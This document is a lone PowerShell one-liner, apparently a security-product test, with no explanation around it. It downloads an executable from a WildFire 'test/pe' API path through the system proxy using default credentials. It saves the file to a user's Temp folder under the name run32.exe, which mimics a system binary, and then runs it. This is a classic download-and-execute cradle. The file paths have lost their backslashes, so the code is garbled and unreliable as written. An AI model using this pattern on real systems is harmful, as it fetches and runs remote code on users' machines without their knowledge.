$wc=new-object Net.WebClient; $wp=[system.net.WebProxy]::GetDefaultProxy(); $wp.UseDefaultCredentials = $true; $wc.proxy = $wp; $wc.DownloadFile('https://wildfire.paloaltonetworks.com/publicapi/test/pe/', 'C:UsersN23498AppDataLocalTemprun32.exe.tmp'); rename-item 'C:UsersN23498AppDataLocalTemprun32.exe.tmp' 'C:UsersN23498AppDataLocalTemprun32.exe'; Start-Process -FilePath 'C:UsersN23498AppDataLocalTemprun32.exe' -NoNewWindow;